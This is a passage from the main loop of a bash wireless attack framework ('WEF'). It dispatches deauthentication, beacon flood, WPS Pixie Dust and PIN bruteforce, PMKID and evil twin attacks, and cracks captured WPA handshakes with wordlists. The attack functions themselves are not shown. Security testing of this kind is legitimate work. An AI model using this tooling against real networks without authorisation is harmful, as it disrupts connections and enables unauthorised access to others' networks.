hostapd-wpe dnsmasq lighttpd &>/dev/null\n  airmon-ng start \"${oldCard}\" &>/dev/null\n}\n\n\n\n\n#\n# Main workflow starts here\n#\n\nparameters=(\"$1\" \"$2\" \"$3\" \"$4\" \"$5\" \"$6\" \"$7\" \"$8\" \"$9\")\nexport lang=\"en\" # Default language\n\nSHELL=\"/bin/bash\"\n\nconfig_lang=$(awk -F '=' '/lang/ {print $2}' /usr/share/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d \" \")\nif [ \"$config_lang\" == \"en\" ]; then\n  lang=\"en\"\nelif [ \"$config_lang\" == \"es\" ]; then\n  lang=\"es\"\nfi\n\nuse_colors=$(awk -F '=' '/use_colors/ {print $2}' /usr/share/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d \" \")\nif [ \"$use_colors\" == \"true\" ] || [ ! -d \"/usr/share/wef\" ]; then\n  # Define colors and formats\n  export greenC=\"\\e[0;32m\\033[1m\"\n  export endC=\"\\033[0m\\e[0m\"\n  export blueC=\"\\e[0;34m\\033[1m\"\n  export yC=\"\\e[0;33m\\033[1m\"\n  export grayC=\"\\e[0;37m\\033[1m\"\nfi\n\nfor parameter in ${parameters[@]}; do\n  if [ \"${parameter}\" == \"-s\" ]; then\n    lang=\"es\"\n  fi\ndone\n\n# Main program function\nif [ \"$(id -u)\" == \"0\" ]; then\n\n  program_version=\"1.4\"\n\n  while getopts \":i:\" arg; do\n    case ${arg} in\n      i) netCard=$OPTARG;\n    esac\n  done\n\n  for parameter in ${parameters[@]}; do\n\n    if [ \"${parameter}\" == \"--version\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"wef v${program_version} for linux (https://github.com/D3Ext/WEF)\"\n        echo -e \"Created by D3Ext <d3ext@proton.me>\"\n      else\n        echo -e \"wef v${program_version} para linux (https://github.com/D3Ext/WEF)\"\n        echo -e \"Creado por D3Ext <d3ext@proton.me>\"\n      fi\n      exit 0\n    fi\n\n    if [ \"$parameter\" == \"-h\" ] || [ \"$parameter\" == \"--help\" ]; then\n      help_panel\n      exit 0\n    fi\n  done\n\n  if [ ! -d \"/usr/share/wef/main/\" ]; then\n    run_setup\n    exit 0\n  fi\n\n  if [ ! -f \"/usr/share/wef/wef.cnf\" ]; then\n    echo \"# This is default config file\n# This file must be saved as /usr/share/wef/wef.cnf\n# Then you can edit it to make it much more flexible and to adapt to your requirements\n\n# Default lenguage to use. Values: en, es\nlang=en\n\n# Colorize output (recommended to be enabled)\nuse_colors=true\n\n# Enable/disable verbose by default (recommended to be enabled)\nverbose=true\" > /usr/share/wef/wef.cnf\n  fi\n\n  if [ \"$1\" == \"--interface\" ]; then\n    netCard=\"$2\"\n  elif [ \"$2\" == \"--interface\" ]; then\n    netCard=\"$3\"\n  elif [ \"$3\" == \"--interface\" ]; then\n    netCard=\"$4\"\n  elif [ \"$4\" == \"--interface\" ]; then\n    netCard=\"$5\"\n  fi\n\n  if [ \"$netCard\" ]; then\n    if [ ! -d \"/sys/class/net/${netCard}\" ]; then\n      echo -e \"${yC} __      _____ ___ \"\n      echo -e \" \\ \\    / / __| __|\"\n      echo -e \"  \\ \\/\\/ /| _|| _| \"\n      echo -e \"   \\_/\\_/ |___|_|  ${endC}\"\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_ln \"X\" \"Interface not found\"\n      else\n        color_output_ln \"X\" \"Interfaz no disponible\"\n      fi\n\n      exit 0\n    fi\n\n    if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n      if [ \"$(check_monitor_type)\" == \"airmon\" ]; then\n        oldCard=$(echo \"${netCard}\" | sed 's/mon//g')\n        evilCard=${oldCard}\n      elif [ \"$(check_monitor_type)\" == \"iw\" ]; then\n        oldCard=${netCard}\n        evilCard=${netCard}\n      fi\n    fi\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"*\" \"WEF v${program_version}\"\n      color_output \"*\" \"Use this tool only under your own responsibility\"\n      progress_bar 2 0.6 \"*\" \"Starting framework\"\n    else\n      color_output \"*\" \"WEF v${program_version}\"\n      color_output \"*\" \"Use esta herramienta unicamente bajo su responsabilidad\"\n      progress_bar 2 0.6 \"*\" \"Iniciando framework\"\n    fi\n\n    if [ \"$(command -v airmon-ng)\" ]; then\n      delim=$(airmon-ng | grep \"${netCard}\" | awk '{print $3}')\n      chipset=\"$(airmon-ng | grep \"${netCard}\" | grep -oP \"(?<=${delim}).*\" | sed 's/^[[:blank:]]*//')\"\n\n      if [ \"$(echo \"${chipset}\" | grep \"unknown\")\" ]; then\n        chipset=\"(unknown)\"\n      fi\n    fi\n\n    parse_config\n\n    # Check if given interface supports monitor mode\n    if [ \"$(command -v iw)\" ] && [ ! \"$(iw list | grep \"Supported interface modes\" -A 8 | grep -i \"monitor\")\" ]; then\n      echo\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Provided interface does not seem to support monitor mode. Do you want to continue? (${yC}yes${blueC}/${yC}no${blueC}): \" && read check_mon\n      else\n        color_output_no_line \"*\" \"La interfaz proporcionada no parece soportar modo monitor. ¿Quieres continuar? (${yC}si${blueC}/${yC}no${blueC}): \" && read check_mon\n      fi\n\n      if [ \"$check_mon\" != \"y\" ] && [ \"$check_mon\" != \"yes\" ] && [ \"$check_mon\" != \"s\" ] && [ \"$check_mon\" != \"si\" ]; then\n        exit 0\n      fi\n    fi\n\n    # Check compulsory tools\n    check_dependencies\n\n    # Check if auto_enable_monitor is set to true\n    if [ \"${auto_enable_monitor}\" == \"true\" ]; then\n      enable_mon\n    else\n      sleep 1\n    fi\n\n    ip link set ${netCard} up 2>/dev/null\n\n    # Define band based on config file\n    if [ \"${frequency_band}\" == \"auto\" ]; then\n      out=\"$(iw list | grep -A 10 'Frequencies:')\"\n      if [ \"$(echo ${out} | grep \"\\[6\\]\")\" ] && [ ! \"$(echo ${out} | grep \"\\[36\\]\")\" ]; then\n        band=\"g\"\n      elif [ \"$(echo ${out} | grep \"\\[6\\]\")\" ] && [ \"$(echo ${out} | grep \"\\[36\\]\")\" ]; then\n        band=\"ag\"\n      fi\n\n    elif [ \"${frequency_band}\" == \"2.4\" ] || [ \"${frequency_band}\" == \"2\" ]; then\n      band=\"g\"\n    elif [ \"${frequency_band}\" == \"5\" ]; then\n      band=\"a\"\n    fi\n\n    clear_p=1 # Define parameter to clear or not the screen\n    while true; do\n      trap keep_exit_c INT\n      input=1\n\n      # Use a counter to not to print the banner and the panel all the times\n      if [ $clear_p == 1 ]; then\n        clear\n        clear_p=0\n\n        banner\n        dir=$(pwd)\n        print_interface_name; print_interface_mode; print_mac_address\n\n        attacks_panel\n        if [ \"$lang\" == \"en\" ]; then\n          echo -e \"\\n${blueC}Type ${yC}help${blueC} to display more functions and commands${endC}\"\n        else\n          echo -e \"\\n${blueC}Escribe ${yC}help${blueC} para ver mas funciones y comandos${endC}\"\n        fi\n      fi\n\n      echo -ne \"\\n${blueC}[${yC}WEF${blueC}] >>${endC} \" && read option\n      input=0\n\n      if [ \"$option\" == \"1\" ] || [ \"$option\" == \"deauth\" ] || [ \"$option\" == \"deauthentication\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Deauthentication Attack\"\n        else\n          type_of_attack=\"Ataque de Deautenticación\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          deauthentication_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"2\" ] || [ \"$option\" == \"wids\" ] || [ \"$option\" == \"confusion\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"WIDS Confusion Attack\"\n        else\n          type_of_attack=\"Ataque de Confusión WIDS\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          wids_confusion_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"3\" ] || [ \"$option\" == \"auth\" ] || [ \"$option\" == \"authentication\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Authentication Attack\"\n        else\n          type_of_attack=\"Ataque de Autenticación\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          authentication_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"4\" ] || [ \"$option\" == \"beacon\" ] || [ \"$option\" == \"beacon flood\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Beacon Flood Attack\"\n        else\n          type_of_attack=\"Ataque Beacon Flood\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          beacon_flood_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"5\" ] || [ \"$option\" == \"michael\" ] || [ \"$option\" == \"tkip\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Michael Shutdown Exploitation Attack (TKIP)\"\n        else\n          type_of_attack=\"Ataque Michael Shutdown Exploitation (TKIP)\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          tkip_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"6\" ] || [ \"$option\" == \"pixiedust\" ] || [ \"$option\" == \"pixie\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Pixie Dust Attack\"\n        else\n          type_of_attack=\"Ataque Pixie Dust\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          echo\n          wps_tools_missing=\"false\"\n          if [ ! \"$(command -v reaver)\" ]; then\n            log_command_not_found \"reaver\"\n            wps_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v wash)\" ]; then\n            log_command_not_found \"wash\"\n            wps_tools_missing=\"true\"\n          fi\n\n          if [ \"$wps_tools_missing\" == \"true\" ]; then\n            continue\n          fi\n\n          pixie_dust_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"7\" ] || [ \"$option\" == \"brute\" ]; then\n        if [ \"$lang\" = \"en\" ]; then\n          type_of_attack=\"PIN Bruteforce Attack\"\n        else\n          type_of_attack=\"Ataque de fuerza bruta de PIN\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          echo\n          wps_tools_missing=\"false\"\n          if [ ! \"$(command -v reaver)\" ]; then\n            log_command_not_found \"reaver\"\n            wps_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v wash)\" ]; then\n            log_command_not_found \"wash\"\n            wps_tools_missing=\"true\"\n          fi\n\n          if [ \"$wps_tools_missing\" == \"true\" ]; then\n            continue\n          fi\n\n          pin_bruteforce_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"8\" ] || [ \"$option\" == \"null\" ] || [ \"$option\" == \"nullpin\" ]; then\n        if [ \"$lang\" = \"en\" ]; then\n          type_of_attack=\"Null Pin Attack\"\n        else\n          type_of_attack=\"Ataque de Pin nulo\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          echo\n          wps_tools_missing=\"false\"\n          if [ ! \"$(command -v reaver)\" ]; then\n            log_command_not_found \"reaver\"\n            wps_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v wash)\" ]; then\n            log_command_not_found \"wash\"\n            wps_tools_missing=\"true\"\n          fi\n\n          if [ \"$wps_tools_missing\" == \"true\" ]; then\n            continue\n          fi\n\n          null_pin_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"9\" ] || [ \"$option\" == \"replay\" ] || [ \"$option\" == \"arp\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"ARP Replay Attack\"\n        else\n          type_of_attack=\"Ataque ARP Replay\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          arp_replay_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"10\" ] || [ \"$option\" == \"hirte\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"HIRTE Attack\"\n        else\n          type_of_attack=\"Ataque HIRTE\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          hirte_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"11\" ] || [ \"$option\" == \"caffelatte\" ] || [ \"$option\" == \"caffe latte\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Caffe Latte Attack\"\n        else\n          type_of_attack=\"Ataque Caffe Latte\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          caffe_latte_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"12\" ] || [ \"$option\" == \"fake\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"Fake Authentication Attack\"\n        else\n          type_of_attack=\"Ataque de falsa autenticación\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          fake_authentication_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"13\" ] || [ \"$option\" == \"passive\" ] || [ \"$option\" == \"wpa\" ] || [ \"$option\" == \"handshake\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"WPA/2 handshake capture attack\"\n        else\n          type_of_attack=\"Ataque de captura de handshake WPA/2\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          passive_capture_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"14\" ] || [ \"$option\" == \"pmkid\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          type_of_attack=\"PMKID Attack\"\n        else\n          type_of_attack=\"Ataque PMKID\"\n        fi\n\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          echo\n          hcx_tools_missing=\"false\"\n          if [ ! \"$(command -v hcxdumptool)\" ]; then\n            log_command_not_found \"hcxdumptool\"\n            hcx_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v hcxpcapngtool)\" ]; then\n            log_command_not_found \"hcxpcapngtool\"\n            hcx_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v hcxhashtool)\" ]; then\n            log_command_not_found \"hcxhashtool\"\n            hcx_tools_missing=\"true\"\n          fi\n\n          if [ \"$hcx_tools_missing\" == \"true\" ]; then\n            continue\n          fi\n\n          pmkid_attack; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"15\" ] || [ \"$option\" == \"pwnagotchi\" ]; then\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          echo\n          pwnagotchi_tools_missing=\"false\"\n\n          if [ ! \"$(command -v hcxpcapngtool)\" ]; then\n            log_command_not_found \"hcxpcapngtool\"\n            pwnagotchi_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v bettercap)\" ]; then\n            log_command_not_found \"bettercap\"\n            pwnagotchi_tools_missing=\"true\"\n          fi\n\n          if [ \"$pwnagotchi_tools_missing\" == \"true\" ]; then\n            continue\n          fi\n\n          pwnagotchi; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n\n      elif [ \"$option\" == \"16\" ] || [ \"$option\" == \"evil\" ] || [ \"$option\" == \"eviltwin\" ] || [ \"$option\" == \"e\" ]; then\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          echo\n          et_tools_missing=\"false\"\n          if [ ! \"$(command -v hostapd)\" ]; then\n            log_command_not_found \"hostapd\"\n            et_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v hostapd-wpe)\" ]; then\n            log_command_not_found \"hostapd-wpe\"\n            et_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v dnsmasq)\" ]; then\n            log_command_not_found \"dnsmasq\"\n            et_tools_missing=\"true\"\n          fi\n\n          if [ ! \"$(command -v lighttpd)\" ]; then\n            log_command_not_found \"lighttpd\"\n            et_tools_missing=\"true\"\n          fi\n\n          if [ \"$et_tools_missing\" == \"true\" ]; then\n            continue\n          fi\n\n          evil_twin; clear_p=1\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"enable\" ] || [ \"$option\" == \"start\" ] || [ \"$option\" == \"monitor\" ]; then\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            echo -e \"\\n${yC}Interface already in monitor mode${endC}\"\n          else\n            echo -e \"\\n${yC}La interfaz ya está en modo monitor${endC}\"\n          fi\n\n        else\n          enable_mon; clear_p=1\n        fi\n\n      elif [ \"$option\" == \"disable\" ] || [ \"$option\" == \"stop\" ]; then\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          disable_mon\n          if [ \"$lang\" == \"en\" ]; then\n            press_enter \"Monitor mode disabled, press [Enter] to continue \"\n          else\n            press_enter \"Modo monitor desactivado, presiona [Enter] para continuar \"\n          fi\n          clear_p=1\n\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            echo -e \"\\n${yC}Interface already in managed mode${endC}\"\n          else\n            echo -e \"\\n${yC}La interfaz ya está en modo managed${endC}\"\n          fi\n        fi\n\n      elif [ \"$option\" == \"mac\" ] || [ \"$option\" == \"random\" ] || [ \"$option\" == \"randomize\" ]; then\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          randomize_mac\n          mac_randomized=\"true\"\n          changed_mac=$(macchanger -s ${netCard} | grep \"Curren\" | awk '{print $3}') # Get new MAC address\n          vendor=\"($(macchanger -s ${netCard} | grep \"Curren\" | awk '{print $2}' FS=\"(\")\" # Get vendor from \"macchanger\" output\n          if [ \"$lang\" == \"en\" ]; then\n            echo -e \"${blueC}[${yC}*${blueC}] New MAC: ${greenC}${changed_mac} ${blueC}${vendor}${endC}\"\n          else\n            echo -e \"${blueC}[${yC}*${blueC}] Nueva dirección MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}\"\n          fi\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"check_vif\" ]; then\n        if [ \"$(check_vif)\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"${netCard} seems to support VIF\"\n          else\n            color_output_ln \"*\" \"${netCard} parece soportar VIF\"\n          fi\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"${netCard} does not seems to support VIF\"\n          else\n            color_output_ln \"*\" \"${netCard} no parece soportar VIF\"\n          fi\n        fi\n\n      elif [ \"$option\" == \"scan\" ]; then\n        if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          scan_aps\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$option\" == \"list\" ] || [ \"$option\" == \"list_aps\" ]; then\n        if [ -f \"/usr/share/wef/cache/airodump-01.csv\" ]; then\n          echo\n          format_csv_info\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"No available APs scan found. Execute ${yC}scan${blueC} to scan APs\"\n          else\n            color_output_ln \"*\" \"Ningún escaneo de APs disponible. Ejecuta ${yC}scan${blueC} para escanear APs\"\n          fi\n        fi\n\n      elif [ \"$(echo ${option} | awk '{print $1}')\" == \"inhibit\" ]; then\n        if [ ! \"$(echo ${option} | awk '{print $2}')\" ]; then # Check is user has provided a BSSID\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Please especify the BSSID and channel of a valid AP to inhibit its connections\"\n            color_output \"*\" \"Usage example: inhibit 84:AA:9C:FB:3C:DC 11\"\n          else\n            color_output_ln \"*\" \"Proporciona la BSSID y el canal de un AP válido para inhibir sus conexiones\"\n            color_output \"*\" \"Ejemplo de uso: inhibit 84:AA:9C:FB:3C:DC 11\"\n          fi\n        elif [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n          ap_bssid=\"$(echo ${option} | awk '{print $2}')\"\n          channel=\"$(echo ${option} | awk '{print $3}')\"\n          echo\n          inhibitor\n        else\n          log_monitor_is_disabled\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"graph\" ]; then\n        csv_file=$(echo $option | awk '{print $2}')\n        output_file=$(echo $option | awk '{print $3}')\n\n        if [ \"$csv_file\" ] && [ -f \"${csv_file}\" ]; then\n          create_graph \"${csv_file}\" \"${output_file}\"\n        elif [ \"$csv_file\" ] && [ ! -f \"${csv_file}\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Especified csv file does not exist\"\n          else\n            color_output_ln \"*\" \"Archivo csv especificado no existe\"\n          fi\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: graph capture.csv graph.png\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: graph captura.csv gráfico.png\"\n          fi\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"check\" ]; then\n        capture_file=$(echo $option | awk '{print $2}')\n\n        if [ ! \"$capture_file\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: check /path/to/capture.cap\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: check /ruta/de/la/captura.cap\"\n          fi\n        elif [ -f \"${capture_file}\" ]; then\n          print_available_handshakes \"${capture_file}\"\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"X\" \"Especified file does not exist!\"\n          else\n            color_output_ln \"X\" \"El archivo especificado no existe!\"\n          fi\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"crack\" ]; then\n        capture_file=\"$(echo \"$option\" | awk '{print $2}')\"\n        wordlist_to_use=\"$(echo \"$option\" | awk '{print $3}')\"\n\n        if [ \"$capture_file\" ] && [ \"$wordlist_to_use\" ]; then\n          if [ \"$wordlist_to_use\" == \"rockyou\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/rockyou.txt\"\n          elif [ \"$wordlist_to_use\" == \"darkweb2017-top10000\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/darkweb2017-top10000.txt\"\n          elif [ \"$wordlist_to_use\" == \"probable-v2-wpa-top4800\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt\"\n          fi\n\n          crack_handshake_aircrack \"${capture_file}\"\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: crack /path/to/capture.cap /path/to/wordlist.txt\"\n            color_output \"*\" \"Preinstalled wordlists are available as argument: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: crack /ruta/de/la/captura.cap /ruta/del/diccionario.txt\"\n            color_output \"*\" \"Los diccionarios preinstalados estan disponibles como argumentos: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800\"\n          fi\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"john\" ]; then\n\n        if [ ! \"$(command -v john)\" ] || [ ! \"$(command -v wpapcap2john)\" ]; then\n          echo\n        fi\n\n        john_tools_missing=\"false\"\n        if [ ! \"$(command -v john)\" ]; then\n          log_command_not_found \"john\"\n          john_tools_missing=\"true\"\n        fi\n\n        if [ ! \"$(command -v wpapcap2john)\" ]; then\n          log_command_not_found \"wpapcap2john\"\n          john_tools_missing=\"true\"\n        fi\n\n        if [ \"${john_tools_missing}\" == \"true\" ]; then\n          continue\n        fi\n\n        capture_file=\"$(echo \"$option\" | awk '{print $2}')\"\n        wordlist_to_use=\"$(echo \"$option\" | awk '{print $3}')\"\n\n        if [ \"$capture_file\" ] && [ \"$wordlist_to_use\" ]; then\n          if [ \"$wordlist_to_use\" == \"rockyou\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/rockyou.txt\"\n          elif [ \"$wordlist_to_use\" == \"darkweb2017-top10000\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/darkweb2017-top10000.txt\"\n          elif [ \"$wordlist_to_use\" == \"probable-v2-wpa-top4800\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt\"\n          fi\n\n          crack_handshake_john \"${capture_file}\"\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: john /path/to/capture.cap /path/to/wordlist.txt\"\n            color_output \"*\" \"Preinstalled wordlists are available as argument: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: john /ruta/de/la/captura.cap /ruta/del/diccionario.txt\"\n            color_output \"*\" \"Los diccionarios preinstalados estan disponibles como argumentos: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800\"\n          fi\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"hashcat\" ]; then\n\n        if [ ! \"$(command -v hashcat)\" ] || [ ! \"$(command -v hcxpcapngtool)\" ]; then\n          echo\n        fi\n\n        hashcat_tools_missing=\"false\"\n        if [ ! \"$(command -v hashcat)\" ]; then\n          log_command_not_found \"hashcat\"\n          hashcat_tools_missing=\"true\"\n        fi\n\n        if [ ! \"$(command -v hcxpcapngtool)\" ]; then\n          log_command_not_found \"hcxpcapngtool\"\n          hashcat_tools_missing=\"true\"\n        fi\n\n        if [ \"$hashcat_tools_missing\" == \"true\" ]; then\n          continue\n        fi\n\n        capture_file=\"$(echo \"$option\" | awk '{print $2}')\"\n        wordlist_to_use=\"$(echo \"$option\" | awk '{print $3}')\"\n\n        if [ \"$capture_file\" ] && [ \"$wordlist_to_use\" ]; then\n          if [ \"$wordlist_to_use\" == \"rockyou\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/rockyou.txt\"\n          elif [ \"$wordlist_to_use\" == \"darkweb2017-top10000\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/darkweb2017-top10000.txt\"\n          elif [ \"$wordlist_to_use\" == \"probable-v2-wpa-top4800\" ]; then\n            wordlist_to_use=\"/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt\"\n          fi\n\n          crack_handshake_hashcat \"${capture_file}\"\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: hashcat /path/to/capture.cap /path/to/wordlist.txt\"\n            color_output \"*\" \"Preinstalled wordlists are available as argument: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: hashcat /ruta/de/la/captura.cap /ruta/del/diccionario.txt\"\n            color_output \"*\" \"Los diccionarios preinstalados estan disponibles como argumentos: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800\"\n          fi\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"convert\" ]; then\n        if [ ! \"$(command -v hcxpcapngtool)\" ]; then\n          echo\n          log_command_not_found \"hcxpcapngtool\"\n          continue\n        fi\n\n        capture_file=\"$(echo \"$option\" | awk '{print $2}')\"\n        output_file=\"$(echo \"$option\" | awk '{print $3}')\"\n        if [ \"$capture_file\" ] && [ \"$output_file\" ]; then\n          hcxpcapngtool -o \"${output_file}\" \"${capture_file}\" &>/dev/null\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"File converted successfully\"\n          else\n            color_output_ln \"*\" \"Archivo convertido correctamente\"\n          fi\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: convert /path/to/capture.cap output.hc22000\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: convert /ruta/de/la/captura.cap output.hc22000\"\n          fi\n        fi\n\n      elif [ \"$(echo $option | awk '{print $1}')\" == \"identify\" ]; then\n        mac_to_identify=\"$(echo \"$option\" | awk '{print $2}')\"\n\n        if [ \"$mac_to_identify\" ]; then\n          vendor=\"$(get_vendor_from_mac \"${mac_to_identify}\")\"\n\n          if [ \"$vendor\" ]; then\n            color_output_ln \"*\" \"Vendor: ${yC}${vendor}\"\n          else\n            color_output_ln \"*\" \"Vendor: ${yC}unknown\"\n          fi\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"*\" \"Usage example: identify 00:c0:ca:b0:23:84\"\n          else\n            color_output_ln \"*\" \"Ejemplo de uso: identify 00:c0:ca:b0:23:84\"\n          fi\n        fi\n\n      elif [ \"$option\" == \"info\" ] || [ \"$option\" == \"status\" ]; then\n        print_interface_name\n        print_interface_mode\n        print_mac_address\n        print_chipset\n        print_freq_band\n\n      elif [ \"$option\" == \"panel\" ]; then\n        attacks_panel\n\n      elif [ \"$option\" == \"attacks\" ]; then\n        log_functions_info\n\n      elif [ \"$option\" == \"chipsets\" ] || [ \"$option\" == \"chipset\" ]; then\n        chipsets_panel\n\n      elif [ \"$option\" == \"update\" ]; then\n        echo\n        if [ \"$lang\" == \"en\" ]; then\n          progress_bar 2 0.3 \"*\" \"Checking the latest version\"\n        else\n          progress_bar 2 0.3 \"*\" \"Comprobando la última versión\"\n        fi\n        sleep 0.2\n        if [ \"$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/src/version.txt')\" != \"${program_version}\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            echo -ne \"\\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read update_option\n          else\n            echo -ne \"\\n${blueC}[${greenC}+${blueC}] Nueva versión encontrada. ¿Quieres actualizar WEF? 